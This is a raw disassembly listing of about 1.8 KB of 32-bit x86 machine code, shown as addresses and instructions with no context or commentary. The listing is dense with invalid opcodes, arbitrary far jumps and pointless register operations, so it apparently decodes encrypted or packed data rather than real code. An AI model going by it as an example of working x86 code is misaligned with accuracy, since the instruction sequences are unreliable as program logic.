  41a6c6:	mov    ds:0xc7242693,eax
  41a6cb:	push   0xffffff82
  41a6cd:	inc    edx
  41a6ce:	ret    
  41a6cf:	cdq    
  41a6d0:	aad    0xe4
  41a6d2:	cmc    
  41a6d3:	mov    esi,0xedbfc2c4
  41a6d8:	fs fs jae 0x41a6cb
  41a6dc:	fisub  DWORD PTR [eax]
  41a6de:	push   ecx
  41a6df:	mov    eax,ecx
  41a6e1:	sub    eax,0x4c5577c7
  41a6e6:	ja     0x41a720
  41a6e8:	xchg   edi,eax
  41a6e9:	stos   DWORD PTR es:[edi],eax
  41a6ea:	pop    esi
  41a6eb:	sbb    BYTE PTR [eax],dl
  41a6ed:	pop    eax
  41a6ee:	xor    eax,0x64029d71
  41a6f3:	sbb    edi,DWORD PTR [edi]
  41a6f5:	push   0x6
  41a6f7:	sub    eax,DWORD PTR [ebx+eiz*1-0x4bf9bf1d]
  41a6fe:	mov    DWORD PTR es:0x9d7b7037,ecx
  41a705:	mov    ds:0xb3190bea,eax
  41a70a:	jne    0x41a6f5
  41a70c:	jb     0x41a729
  41a70e:	xchg   esi,eax
  41a70f:	cwde   
  41a710:	cmp    al,0x32
  41a712:	xchg   esi,eax
  41a713:	jno    0x41a789
  41a715:	lods   al,BYTE PTR ds:[esi]
  41a716:	fist   DWORD PTR [ebx]
  41a718:	mov    esi,0xdad324a8
  41a71d:	ss pop ebp
  41a71f:	imul   esi,DWORD PTR [eax-0x29f3b88a],0x4
  41a726:	sbb    eax,0x16e12957
  41a72b:	dec    esp
  41a72c:	fnsave [ebx-0x2d]
  41a72f:	push   ebp
  41a730:	sbb    DWORD PTR [esp+edx*1-0x75376ab3],ecx
  41a737:	ja     0x41a774
  41a739:	push   cs
  41a73a:	mul    DWORD PTR [edx-0x1623049f]
  41a740:	out    dx,eax
  41a741:	and    ch,BYTE PTR [ebx-0x3a]
  41a744:	repnz inc edi
  41a746:	stos   BYTE PTR es:[edi],al
  41a747:	push   esi
  41a748:	pop    es
  41a749:	push   esp
  41a74a:	lods   al,BYTE PTR ds:[esi]
  41a74b:	push   eax
  41a74c:	or     eax,0x4884f646
  41a751:	jge    0x41a7c6
  41a753:	add    ah,BYTE PTR [esi+eax*4]
  41a756:	push   esp
  41a757:	cwde   
  41a758:	lods   al,BYTE PTR ds:[esi]
  41a759:	xlat   BYTE PTR ds:[ebx]
  41a75a:	inc    edi
  41a75b:	ins    DWORD PTR es:[edi],dx
  41a75c:	jbe    0x41a6f7
  41a75e:	pop    ecx
  41a75f:	shr    edx,0x2
  41a762:	mov    edi,0x220cacec
  41a767:	push   esi
  41a768:	mov    edx,0x42c4e73c
  41a76d:	(bad)
  41a770:	cld    
  41a771:	gs aad 0xac
  41a774:	rcl    DWORD PTR [ebx-0x1226acd3],1
  41a77a:	sbb    bl,BYTE PTR [edi+0x2d]
  41a77d:	add    al,0xc2
  41a77f:	dec    ebp
  41a780:	mov    ch,BYTE PTR [eax-0x2c1fab9b]
  41a786:	cmp    bh,BYTE PTR [edi+0x197c748e]
  41a78c:	inc    esi
  41a78d:	dec    esp
  41a78e:	mov    ebx,0xf963d72c
  41a793:	inc    esp
  41a794:	mov    al,0x73
  41a796:	xor    al,0xc8
  41a798:	sub    eax,0xc91c2822
  41a79d:	mov    ch,0x25
  41a79f:	int    0xb4
  41a7a1:	leave  
  41a7a2:	rsqrtps xmm7,XMMWORD PTR ds:0x73d68df1
  41a7a9:	mov    esi,0x6418569a
  41a7ae:	mov    ds:0x282e4a8a,eax
  41a7b3:	xchg   bl,bl
  41a7b5:	pop    ecx
  41a7b6:	and    ah,bh
  41a7b8:	jbe    0x41a7dd
  41a7ba:	push   ds
  41a7bb:	mov    ebx,DWORD PTR [edi+0x24]
  41a7be:	cmp    bh,BYTE PTR [eax+0x12d376f4]
  41a7c4:	cli    
  41a7c5:	adc    edi,esp
  41a7c7:	ret    
  41a7c8:	and    ebx,DWORD PTR [ebp+0x3662d914]
  41a7ce:	inc    ecx
  41a7cf:	jecxz  0x41a841
  41a7d1:	lods   al,BYTE PTR ds:[esi]
  41a7d2:	pop    ecx
  41a7d3:	inc    ebx
  41a7d4:	mov    ecx,0x6d12e71f
  41a7d9:	(bad)  
  41a7da:	sub    eax,0xe7fc8d28
  41a7df:	stos   BYTE PTR es:[edi],al
  41a7e0:	mov    ebp,0x425c0e36
  41a7e5:	rol    ebp,1
  41a7e7:	mov    ebp,0xde4a84b3
  41a7ec:	mov    eax,ds:0x696c98ed
  41a7f1:	retf   0x4939
  41a7f4:	int3   
  41a7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7f6:	push   edx
  41a7f7:	jp     0x41a7e6
  41a7f9:	xor    ecx,eax
  41a7fb:	jmp    0xdd26:0x1cd04ac8
  41a802:	mov    edx,0x9b181e51
  41a807:	fs stos DWORD PTR es:[edi],eax
  41a809:	pusha  
  41a80a:	repnz mov esi,0x390a4878
  41a810:	into   
  41a811:	popa   
  41a812:	test   eax,0x510f07a2
  41a817:	popa   
  41a818:	repnz shl DWORD PTR [edx+0x40],1
  41a81c:	push   edi
  41a81d:	loope  0x41a82b
  41a81f:	dec    esi
  41a820:	popa   
  41a821:	ss jnp 0x41a892
  41a824:	in     al,dx
  41a825:	out    0xd9,eax
  41a827:	in     eax,0x6c
  41a829:	iret   
  41a82a:	mov    dl,0xb5
  41a82c:	bound  ecx,QWORD PTR [ebp+eax*1+0x512079ba]
  41a833:	or     ah,cl
  41a835:	jge    0x41a8b4
  41a837:	pop    ds
  41a838:	mov    al,0xcc
  41a83a:	cld    
  41a83b:	mov    edx,0xaef0cc39
  41a840:	mov    cl,0x4e
  41a842:	cmp    DWORD PTR [eax+edx*1+0x2f17d9b0],ebx
  41a849:	and    ebx,eax
  41a84b:	mov    ch,0x3b
  41a84d:	call   0xc942:0xd8d6893c
  41a854:	pop    esi
  41a855:	dec    edx
  41a856:	or     DWORD PTR [edx+0x3bb128af],ebx
  41a85c:	jecxz  0x41a850
  41a85e:	clc    
  41a85f:	sub    al,0x11
  41a861:	iret   
  41a862:	mov    dl,0xc1
  41a864:	lahf   
  41a865:	jne    0x41a894
  41a867:	xor    eax,0x85c09053
  41a86c:	ror    DWORD PTR [esp+edi*2+0x3e],cl
  41a870:	popf   
  41a871:	stos   BYTE PTR es:[edi],al
  41a872:	xor    edx,DWORD PTR [ecx+0x49770c65]
  41a878:	packssdw mm1,QWORD PTR [ecx+0x515360a3]
  41a87f:	mov    ebx,esp
  41a881:	fcomp  QWORD PTR ds:0x9088563c
  41a887:	adc    BYTE PTR [edx-0x2a],bl
  41a88a:	mov    ecx,0x679855cf
  41a88f:	sub    al,BYTE PTR [ecx+0x1a]
  41a892:	xchg   esi,eax
  41a893:	mov    esi,0x5170f501
  41a898:	repnz stos DWORD PTR es:[edi],eax
  41a89a:	and    edx,DWORD PTR [ebx]
  41a89c:	test   DWORD PTR [ebp-0x2b],0x2e02c37c
  41a8a3:	and    dh,BYTE PTR [ecx]
  41a8a5:	cmc    
  41a8a6:	aad    0x41
  41a8a8:	and    ebx,DWORD PTR [edx-0x77]
  41a8ab:	(bad)  [edi+0x47]
  41a8ae:	mov    al,0xeb
  41a8b0:	add    DWORD PTR [ebp+0xd],ebp
  41a8b3:	dec    edx
  41a8b4:	aad    0xc4
  41a8b6:	push   ecx
  41a8b7:	xor    edi,DWORD PTR [ebp+0x54]
  41a8ba:	pop    edx
  41a8bb:	out    0x61,al
  41a8bd:	dec    ecx
  41a8be:	push   ecx
  41a8bf:	sbb    eax,0x616bb5dd
  41a8c4:	jp     0x41a8ea
  41a8c6:	adc    BYTE PTR [eax-0x6d],al
  41a8c9:	and    edx,edi
  41a8cb:	push   ebx
  41a8cc:	mov    al,ds:0x6b6c094f
  41a8d1:	push   cs
  41a8d2:	cmp    al,0xd7
  41a8d4:	stos   DWORD PTR es:[edi],eax
  41a8d5:	mov    DWORD PTR [eax+0x5a59d49d],esp
  41a8db:	shr    edi,1
  41a8dd:	pop    ebp
  41a8de:	add    BYTE PTR [ecx],0xe7
  41a8e1:	jno    0x41a912
  41a8e3:	dec    ebx
  41a8e4:	fiadd  WORD PTR [ebx-0x1eea0a7]
  41a8ea:	and    eax,0x40a49ce0
  41a8ef:	popa   
  41a8f0:	push   ebp
  41a8f1:	add    DWORD PTR [edx-0x1e],esi
  41a8f4:	lods   al,BYTE PTR ds:[esi]
  41a8f5:	fs dec edi
  41a8f7:	sti    
  41a8f8:	in     eax,dx
  41a8f9:	xchg   edx,eax
  41a8fa:	pop    ecx
  41a8fb:	aas    
  41a8fc:	fisttp QWORD PTR [ecx+0x21]
  41a8ff:	sbb    DWORD PTR [ebx+0x29c5b16d],eax
  41a905:	shr    BYTE PTR [ebp+edi*8+0x51],cl
  41a909:	fmul   DWORD PTR [esi+0x7a93884c]
  41a90f:	sahf   
  41a910:	jb     0x41a910
  41a912:	fiadd  DWORD PTR [esi-0x73d73fbd]
  41a918:	and    BYTE PTR [esi+0x3d],cl
  41a91b:	push   ebp
  41a91c:	push   ecx
  41a91d:	mov    ds:0x62f49f23,al
  41a922:	test   BYTE PTR [edi+0x5934734b],bh
  41a928:	ret    
  41a929:	fwait
  41a92a:	pop    ecx
  41a92b:	inc    edi
  41a92c:	dec    edx
  41a92d:	mov    BYTE PTR [ebx+edi*1+0x6d8e3259],dh
  41a934:	(bad)  
  41a935:	jge    0x41a937
  41a937:	outs   dx,BYTE PTR ds:[esi]
  41a938:	xor    edi,ebx
  41a93a:	pop    esp
  41a93b:	jmp    0x6402:0x1eda2073
  41a942:	dec    ebx
  41a943:	clc    
  41a944:	dec    ebx
  41a945:	pop    es
  41a946:	and    DWORD PTR [esi+0x5b],ebp
  41a949:	push   ds
  41a94a:	inc    esp
  41a94b:	push   esp
  41a94c:	dec    edi
  41a94d:	sub    BYTE PTR [ebp-0x3c],ah
  41a950:	pop    ecx
  41a951:	sbb    ebx,DWORD PTR ds:0x91c77b02
  41a957:	and    esi,DWORD PTR [eax]
  41a959:	mov    bl,0xfa
  41a95b:	stos   BYTE PTR es:[edi],al
  41a95c:	mov    eax,ds:0xdbcdbfa7
  41a961:	int3   
  41a962:	or     al,0xd0
  41a964:	sbb    al,0x18
  41a966:	sub    al,0xb7
  41a968:	or     DWORD PTR [eax-0x5f43bc4f],edx
  41a96e:	dec    edi
  41a96f:	daa    
  41a970:	test   eax,0x91aaa5d6
  41a975:	add    esi,DWORD PTR [ecx-0x3563c8b]
  41a97b:	rol    ebx,cl
  41a97d:	xor    al,0x95
  41a97f:	scas   al,BYTE PTR es:[edi]
  41a980:	es ins BYTE PTR es:[edi],dx
  41a982:	mov    cl,0xa1
  41a984:	xchg   ecx,eax
  41a985:	in     al,0xa5
  41a987:	inc    edx
  41a988:	adc    al,0x55
  41a98a:	xlat   BYTE PTR ds:[ebx]
  41a98b:	push   ds
  41a98c:	xchg   edx,eax
  41a98d:	dec    edx
  41a98e:	jns    0x41a988
  41a990:	inc    ebx
  41a991:	ror    BYTE PTR [ebx-0x4f924777],1
  41a997:	inc    esi
  41a998:	push   0xfffffff3
  41a99a:	inc    edx
  41a99b:	fst    QWORD PTR [edi+0x235486e3]
  41a9a1:	xor    edi,DWORD PTR [ebp-0x3895f565]
  41a9a7:	xchg   BYTE PTR [esi+0x294e717f],dh
  41a9ad:	dec    ecx
  41a9ae:	push   edx
  41a9af:	push   0xffffff8f
  41a9b1:	sub    eax,0x5c0eab33
  41a9b6:	cmp    ecx,DWORD PTR [edi+0x5]
  41a9b9:	fsubr  DWORD PTR [eax-0x2e]
  41a9bc:	fnstsw WORD PTR [edi]
  41a9be:	outs   dx,BYTE PTR ds:[esi]
  41a9bf:	mov    eax,DWORD PTR [eax-0x5d]
  41a9c2:	jne    0x41a984
  41a9c4:	xor    esp,DWORD PTR [edi]
  41a9c6:	or     BYTE PTR [ecx-0x346f83ac],al
  41a9cc:	add    DWORD PTR [eax+esi*1-0x6c487937],edx
  41a9d3:	mov    cl,BYTE PTR [ebx+0x0]
  41a9d6:	mov    al,ds:0x80a3c3c0
  41a9db:	daa    
  41a9dc:	sub    bl,BYTE PTR ds:0xc6530266
  41a9e2:	xchg   ecx,eax
  41a9e3:	adc    DWORD PTR [ebp+eax*8+0xa9a958d],edi
  41a9ea:	mov    dl,0x58
  41a9ec:	call   0xabea6155
  41a9f1:	lea    ebx,[edx]
  41a9f3:	and    edx,edx
  41a9f5:	js     0x41aa17
  41a9f7:	push   esi
  41a9f8:	inc    eax
  41a9f9:	cmp    eax,0xac4556cc
  41a9fe:	jmp    0xb253:0xffebddf0
  41aa05:	mov    DWORD PTR [edi-0x21],esp
  41aa08:	sbb    BYTE PTR [ecx+eax*2],cl
  41aa0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa0c:	ins    BYTE PTR es:[edi],dx
  41aa0d:	popf   
  41aa0e:	mov    dh,0x9b
  41aa10:	pop    ss
  41aa11:	rcl    BYTE PTR [ebx],cl
  41aa13:	mov    ebp,DWORD PTR [edx-0x6d]
  41aa16:	loop   0x41a99b
  41aa18:	sbb    BYTE PTR [ebp-0x5e189ec],0x5b
  41aa1f:	cld    
  41aa20:	dec    ecx
  41aa21:	xchg   esi,eax
  41aa22:	stc    
  41aa23:	cmp    al,0xc6
  41aa25:	fs (bad) 
  41aa28:	lahf   
  41aa29:	call   0x72606436
  41aa2e:	jl     0x41aa76
  41aa30:	add    cl,BYTE PTR [di+0x486e]
  41aa35:	push   cs
  41aa36:	dec    edx
  41aa37:	sbb    eax,DWORD PTR [ebx-0x5d]
  41aa3a:	xor    dl,cl
  41aa3c:	frstor [edx+0x72556e0e]
  41aa42:	mov    ds:0x2fc8d6d2,eax
  41aa47:	jge    0x41aa7e
  41aa49:	jo     0x41aa16
  41aa4b:	mov    cl,bh
  41aa4d:	jge    0x41aaa9
  41aa4f:	pop    edi
  41aa50:	pandn  mm1,QWORD PTR [eax+esi*2-0x7b]
  41aa55:	cmp    BYTE PTR [ebp-0x2a87a661],al
  41aa5b:	scas   al,BYTE PTR es:[edi]
  41aa5c:	inc    ebx
  41aa5d:	add    cl,BYTE PTR [edi]
  41aa5f:	loopne 0x41aa8f
  41aa61:	jge    0x41a9f9
  41aa63:	jecxz  0x41aabd
  41aa65:	mov    ebx,0xae1887d2
  41aa6a:	test   eax,0xa95516
  41aa6f:	mov    esp,DWORD PTR [ebx+ecx*4]
  41aa72:	adc    eax,ebx
  41aa74:	pop    eax
  41aa75:	iret   
  41aa76:	dec    edx
  41aa77:	push   ecx
  41aa78:	mov    DWORD PTR [esi+0x32],edi
  41aa7b:	(bad)  
  41aa7c:	dec    esi
  41aa7d:	es stc 
  41aa7f:	mov    eax,0x3195a152
  41aa84:	inc    edx
  41aa85:	push   0x3745afd5
  41aa8a:	out    0xdf,al
  41aa8c:	data16 stc 
  41aa8e:	mov    ah,0xcf
  41aa90:	jne    0x41aa6f
  41aa92:	jbe    0x41aa5f
  41aa94:	test   dh,dh
  41aa96:	adc    DWORD PTR [ebp+0x7e],eax
  41aa99:	daa    
  41aa9a:	add    al,BYTE PTR [edx]
  41aa9c:	jge    0x41aa3c
  41aa9e:	pop    edx
  41aa9f:	pop    esi
  41aaa0:	add    BYTE PTR ds:0x3fced66c,dh
  41aaa6:	cld    
  41aaa7:	pop    ecx
  41aaa8:	div    DWORD PTR [eax]
  41aaaa:	je     0x41aae1
  41aaac:	add    esp,DWORD PTR [ebx-0x63]
  41aaaf:	xchg   esp,eax
  41aab0:	fwait
  41aab1:	lods   al,BYTE PTR ds:[esi]
  41aab2:	sbb    ebp,DWORD PTR [eax+0x72e78da9]
  41aab8:	dec    edi
  41aab9:	dec    ebp
  41aaba:	(bad)
  41aabd:	sbb    DWORD PTR [ecx+esi*4],ecx
  41aac0:	test   DWORD PTR [esi+0x51294371],eax
  41aac6:	push   eax
  41aac7:	outs   dx,DWORD PTR ds:[esi]
  41aac8:	push   ecx
  41aac9:	gs xchg edx,eax
  41aacb:	mul    DWORD PTR [esi]
  41aacd:	jno    0x41aaf6
  41aacf:	leave  
  41aad0:	dec    eax
  41aad1:	dec    ebp
  41aad2:	test   al,0x7d
  41aad4:	jns    0x41aac5
  41aad6:	mov    edi,eax
  41aad8:	push   ds
  41aad9:	out    0x61,al
  41aadb:	sub    BYTE PTR [edx],dl
  41aadd:	xor    BYTE PTR [eax+ecx*1-0x7e5b9bca],ch
  41aae4:	lods   eax,DWORD PTR ds:[esi]
  41aae5:	ins    BYTE PTR es:[edi],dx
  41aae6:	sub    bl,BYTE PTR [edx+ebp*8]
  41aae9:	xchg   esp,eax
  41aaea:	out    dx,al
  41aaeb:	ins    DWORD PTR es:[edi],dx
  41aaec:	mov    edx,0x5c1a8dfa
  41aaf1:	lods   eax,DWORD PTR ds:[esi]
  41aaf2:	and    edi,esp
  41aaf4:	sub    ecx,DWORD PTR [edx+0x753dbbd]
  41aafa:	push   ebp
  41aafb:	xchg   ecx,eax
  41aafc:	xchg   ebx,eax
  41aafd:	adc    al,BYTE PTR [edx+eax*1-0x5c33346d]
  41ab04:	sbb    BYTE PTR [edi],dh
  41ab06:	cld    
  41ab07:	ds aaa 
  41ab09:	dec    edx
  41ab0a:	aas    
  41ab0b:	push   esi
  41ab0c:	retf   0x8828
  41ab0f:	retw   0x81dc
  41ab13:	pop    ds
  41ab14:	(bad)  
  41ab15:	and    DWORD PTR [ebx+0x66],edx
  41ab18:	rcl    ecx,1
  41ab1a:	aam    0x4
  41ab1c:	fcom   QWORD PTR [ebx+0x326a1909]
  41ab22:	mov    dl,0x35
  41ab24:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ab27:	xchg   esi,eax
  41ab28:	xchg   ebp,eax
  41ab29:	out    0xe8,al
  41ab2b:	gs dec ebp
  41ab2d:	arpl   bp,bx
  41ab2f:	mov    dh,0xb7
  41ab31:	and    DWORD PTR [ecx+esi*4+0x10ac7751],ebx
  41ab38:	(bad)  
  41ab39:	pushf  
  41ab3a:	dec    ebx
  41ab3b:	js     0x41aad3
  41ab3d:	fcmovu st,st(0)
  41ab3f:	sbb    BYTE PTR [eax],al
  41ab41:	jno    0x41aaf4
  41ab43:	dec    esp
  41ab44:	mov    BYTE PTR [eax-0x3],bl
  41ab47:	push   0xfe01c6d6
  41ab4c:	pop    ebx
  41ab4d:	or     BYTE PTR [ebx-0x7876e5fc],ah
  41ab53:	popa   
  41ab54:	mov    edx,0xdd2595a3
  41ab59:	div    BYTE PTR [esi]
  41ab5b:	int3   
  41ab5c:	cmp    al,0xcf
  41ab5e:	lods   eax,DWORD PTR ds:[esi]
  41ab5f:	ins    BYTE PTR es:[edi],dx
  41ab60:	inc    ebx
  41ab61:	pop    ebx
  41ab62:	lods   eax,DWORD PTR ds:[esi]
  41ab63:	loop   0x41aba7
  41ab65:	shl    BYTE PTR [ebx+eax*4],0x59
  41ab69:	bound  ebx,QWORD PTR [ebp-0x54e0b7e3]
  41ab6f:	cld    
  41ab70:	sbb    bh,BYTE PTR [ebp-0x420bbe8e]
  41ab76:	rol    BYTE PTR [eax+eiz*8+0x40],0x9e
  41ab7b:	call   0x97e3:0xf8f1d4f3
  41ab82:	adc    al,0xf1
  41ab84:	xchg   ebp,eax
  41ab85:	cmp    bh,BYTE PTR [ebp+0x709560ac]
  41ab8b:	ins    DWORD PTR es:[edi],dx
  41ab8c:	add    al,0x20
  41ab8e:	rcr    DWORD PTR [ecx+0xe],0x3
  41ab92:	mov    bh,0x6e
  41ab94:	fdivr  st,st(1)
  41ab96:	and    al,0xaf
  41ab98:	lods   eax,DWORD PTR ds:[esi]
  41ab99:	jmp    0x41ab54
  41ab9b:	xchg   ebx,eax
  41ab9c:	sub    BYTE PTR [edi],bl
  41ab9e:	adc    bl,al
  41aba0:	cmp    eax,0xe53ba1f5
  41aba5:	dec    eax
  41aba6:	and    ecx,DWORD PTR [esi]
  41aba8:	inc    edi
  41aba9:	cmp    al,0xec
  41abab:	xchg   ebp,eax
  41abac:	xlat   BYTE PTR ds:[ebx]
  41abad:	aaa    
  41abae:	rcl    DWORD PTR [ecx+0x70],0x70
  41abb2:	das    
  41abb3:	in     eax,0xbb
  41abb5:	je     0x41ac29
  41abb7:	xchg   DWORD PTR [eax-0x546d90ed],eax
  41abbd:	or     DWORD PTR ds:[edx],0x227fcbc5
  41abc4:	sub    al,0xf
  41abc6:	add    esi,DWORD PTR [ebp+ecx*4+0x5694cdf5]
  41abcd:	mov    edi,0x20cd0752
  41abd2:	add    ah,BYTE PTR [ebx+esi*2]
  41abd5:	mov    ebp,edx
  41abd7:	inc    ebx
  41abd8:	pop    es
  41abd9:	aad    0xb
  41abdb:	(bad)  
  41abdc:	mov    ebx,0xbdbbf254
  41abe2:	mov    al,BYTE PTR [edi+ebp*8+0x5d5ac4aa]
  41abe9:	lods   eax,DWORD PTR ds:[esi]
  41abea:	ins    BYTE PTR es:[edi],dx
  41abeb:	(bad)  
  41abec:	test   al,0xb5
  41abee:	cs lock xchg ebp,eax
  41abf1:	test   DWORD PTR [edx+0x30cfe38c],esi
  41abf7:	retf   0x8c06
  41abfa:	(bad)  
  41abfb:	imul   ebx
  41abfd:	adc    al,0xfb
  41abff:	punpcklwd mm7,DWORD PTR [edx-0x2d5dad94]
  41ac06:	cs das 
  41ac08:	test   DWORD PTR [edi+eax*4],edi
  41ac0b:	mov    BYTE PTR [edi+edx*2+0x45],ch
  41ac0f:	cmp    eax,0x2d
  41ac12:	push   eax
  41ac13:	jno    0x41ac19
  41ac15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac16:	scas   al,BYTE PTR es:[edi]
  41ac17:	push   esi
  41ac18:	lahf   
  41ac19:	xor    BYTE PTR [edi+0x77],dh
  41ac1c:	pop    ebp
  41ac1d:	fsubr  QWORD PTR [ebp+0x5b]
  41ac20:	in     eax,dx
  41ac21:	pcmpeqw mm0,QWORD PTR [eax-0x150223ba]
  41ac28:	or     dh,dl
  41ac2a:	sbb    eax,0x551f57b0
  41ac2f:	cmp    al,0x58
  41ac31:	neg    BYTE PTR [eax]
  41ac33:	or     al,0xeb
  41ac35:	jns    0x41abd1
  41ac37:	cmp    dh,dl
  41ac39:	fisttp QWORD PTR [edi-0x70be5718]
  41ac3f:	test   BYTE PTR [ecx-0x70e5f9ae],ch
  41ac45:	pop    edx
  41ac46:	pop    ecx
  41ac47:	loop   0x41acba
  41ac49:	imul   BYTE PTR [edi+0x20]
  41ac4c:	sub    al,0x55
  41ac4e:	(bad)  
  41ac4f:	iret   
  41ac50:	push   esp
  41ac51:	or     BYTE PTR [ecx+0xa],0xf3
  41ac55:	loopne 0x41acd0
  41ac57:	or     eax,0x17b43b94
  41ac5c:	push   0xe4dd988a
  41ac61:	xlat   BYTE PTR ds:[ebx]
  41ac62:	xchg   esi,eax
  41ac63:	push   ebx
  41ac64:	pop    ss
  41ac65:	stos   DWORD PTR es:[edi],eax
  41ac66:	retf   0x55d2
  41ac69:	push   edx
  41ac6a:	nop
  41ac6b:	or     DWORD PTR [ecx+0x114a158c],ecx
  41ac71:	pop    edi
  41ac72:	test   eax,0x2ef5f707
  41ac77:	shl    DWORD PTR [eax-0x2fd65012],1
  41ac7d:	repnz out dx,eax
  41ac7f:	pop    eax
  41ac80:	imul   ecx,esp,0x6a
  41ac83:	mov    al,BYTE PTR [ebx]
  41ac85:	scas   eax,DWORD PTR es:[edi]
  41ac86:	pop    es
  41ac87:	xor    DWORD PTR [ebp+0x4f],esp
  41ac8a:	ror    DWORD PTR [ebx],cl
  41ac8c:	inc    esi
  41ac8d:	xor    eax,0x44c6c25e
  41ac92:	aad    0xd0
  41ac94:	std    
  41ac95:	(bad)  
  41ac96:	push   edx
  41ac97:	imul   eax,edi,0x36546587
  41ac9d:	sub    eax,0x8d8a3dbc
  41aca2:	into   
  41aca3:	ret    0x503d
  41aca6:	jg     0x41ad25
  41aca8:	mov    ah,0xf9
  41acaa:	into   
  41acab:	pop    esi
  41acac:	xlat   BYTE PTR ds:[ebx]
  41acad:	add    ecx,edx
  41acaf:	jg     0x41ad03
  41acb1:	test   BYTE PTR [edi+0x50eff721],0xb4
  41acb8:	xchg   edi,eax
  41acb9:	test   DWORD PTR [eax+0x6c17f38],eax
  41acbf:	ss push ecx
  41acc1:	xchg   DWORD PTR [ebp-0x2e7ea479],ecx
  41acc7:	push   0xfffffff7
  41acc9:	and    al,0xc8
  41accb:	dec    eax
  41accc:	out    dx,eax
  41accd:	mov    esi,0xbb01e74
  41acd2:	inc    esp
  41acd3:	xor    DWORD PTR [ebx+ecx*1+0x6],0xffffff9d
  41acd8:	add    al,0xb2
  41acda:	cs xchg esp,eax
  41acdc:	loopne 0x41ac84
  41acde:	and    al,0x7
  41ace0:	inc    ebp
  41ace1:	enter  0x132e,0xb5
  41ace5:	sahf   
  41ace6:	rcr    BYTE PTR [eax+0x5c],cl
  41ace9:	mov    DWORD PTR [ebx+eiz*8-0x7b7b019c],esp
  41acf0:	mov    ebx,0xf9a3065a
  41acf5:	shl    DWORD PTR [edi+eiz*8],0x15
  41acf9:	imul   ebp,DWORD PTR [esp+ebx*1+0x185b3370],0xffffffc7
  41ad01:	icebp  
  41ad02:	pop    esi
  41ad03:	inc    esi
  41ad04:	pop    ss
  41ad05:	retf   
  41ad06:	ret    
  41ad07:	icebp  
  41ad08:	sar    DWORD PTR [ebx+0x724b257d],cl
  41ad0e:	sbb    ebx,edi
  41ad10:	rcr    ch,0x3c
  41ad13:	add    al,0x57
  41ad15:	ins    BYTE PTR es:[edi],dx
  41ad16:	xor    DWORD PTR [edx+0x4291cad8],0x4c
  41ad1d:	jb     0x41acc1
  41ad1f:	sar    DWORD PTR [eax+0x18],1
  41ad22:	xlat   BYTE PTR ds:[ebx]
  41ad23:	data16 (bad) 
  41ad25:	sub    BYTE PTR [ecx-0x1123bcc],dl
  41ad2b:	xchg   DWORD PTR [ecx+0x2264a78f],ecx
  41ad31:	mov    edi,DWORD PTR [ebx+edi*1-0x5a]
  41ad35:	xlat   BYTE PTR ds:[ebx]
  41ad36:	ja     0x41ad8a
  41ad38:	mov    ch,0xdb
  41ad3a:	lds    esi,FWORD PTR [esi+0x1d]
  41ad3d:	push   ecx
  41ad3e:	(bad)  
  41ad3f:	jb     0x41ad38
  41ad41:	xchg   BYTE PTR [ecx+0x4f607063],al
  41ad47:	jo     0x41ad7c
  41ad49:	loop   0x41ad04
  41ad4b:	pop    ebp
  41ad4c:	sar    BYTE PTR [esi+ebp*4],1
  41ad4f:	outs   dx,DWORD PTR ds:[esi]
  41ad50:	sahf   
  41ad51:	add    ebp,DWORD PTR [edx-0x17]
  41ad54:	aas    
  41ad55:	ret    
  41ad56:	rol    edx,cl
  41ad58:	jnp    0x41ace2
  41ad5a:	dec    ebp
  41ad5b:	sub    ah,BYTE PTR [ebp+0x50]
  41ad5e:	xchg   DWORD PTR [edi],eax
  41ad60:	dec    ecx
  41ad61:	clc    
  41ad62:	retf   0xa7c
  41ad65:	add    BYTE PTR ds:0xc57a0b00,ah
  41ad6b:	data16 arpl WORD PTR [ebx-0x79],sp
  41ad6f:	inc    eax
  41ad70:	(bad)  
  41ad71:	(bad)  
  41ad72:	scas   al,BYTE PTR es:[edi]
  41ad73:	sub    BYTE PTR [ecx-0x26e58def],0x5a
  41ad7a:	outs   dx,BYTE PTR ds:[esi]
  41ad7b:	sbb    ebp,DWORD PTR [edx+0x35ba45a3]
  41ad81:	sbb    eax,DWORD PTR [eax+0x54]
  41ad84:	fsub   st(6),st
  41ad86:	nop
  41ad87:	mov    ds,WORD PTR [edi+0x58e56b39]
  41ad8d:	sbb    BYTE PTR [ebx],ch
  41ad8f:	jne    0x41ad7b
  41ad91:	sbb    ebp,DWORD PTR [edx-0x2957779d]
  41ad97:	sbb    DWORD PTR [eax+0x42f06307],edx
  41ad9d:	sbb    esp,DWORD PTR [edi-0xe8ed42d]
  41ada3:	hlt    
  41ada4:	(bad)  
  41ada5:	push   edx
  41ada6:	add    DWORD PTR [edi],ecx
  41ada8:	mov    bl,0x87
  41adaa:	cli    
  41adab:	cmc    
  41adac:	or     eax,0x689c2354
  41adb1:	rcr    DWORD PTR [ebx-0x2f],cl
  41adb4:	push   ds
  41adb5:	dec    esi
  41adb6:	mov    esp,0xf28d6221
  41adbb:	into   
  41adbc:	push   ebp
  41adbd:	shl    edi,cl
  41adbf:	xlat   BYTE PTR ds:[ebx]
  41adc0:	pop    fs
  41adc2:	cmp    edx,edx
  41adc4:	xor    ah,BYTE PTR [edi-0x597f9cc5]
  41adca:	ins    BYTE PTR es:[edi],dx
  41adcb:	fisub  DWORD PTR [eax+0x1]
  41adce:	jge    0x41adf2
  41add0:	mov    BYTE PTR [edx],al
  41add2:	mov    ah,0x1c
  41add4:	lock pop edi
  41add6:	add    eax,0x78e16bc9
  41addb:	outs   dx,BYTE PTR ds:[esi]
  41addc:	cwde   
  41addd:	add    eax,edi
  41addf:	pop    esp
  41ade0:	repz retf 
  41ade2:	xchg   BYTE PTR ds:[edi],ah
  41ade5:	(bad)  
  41ade6:	xchg   esp,eax
  41ade7:	es popf 
  41ade9:	test   BYTE PTR [esi],dh
  41adeb:	lods   al,BYTE PTR ds:[esi]
  41adec:	pushf  
  41aded:	into   
  41adee:	mov    bl,0x9b
  41adf0:	mov    dh,0x38
  41adf2:	jmp    0x41ad7b
  41adf4:	mov    edi,0xa962ec0c
  41adf9:	mov    ?,WORD PTR [edi]
  41adfb:	xacquire xchg DWORD PTR es:[edx],ebp
  41adff:	test   eax,0x89f120e3
  41ae04:	mov    eax,ds:0x2b74c95b
  41ae09:	mov    ecx,0xb49918c7
  41ae0e:	inc    ecx
  41ae0f:	fdiv   DWORD PTR [ebx-0x21]
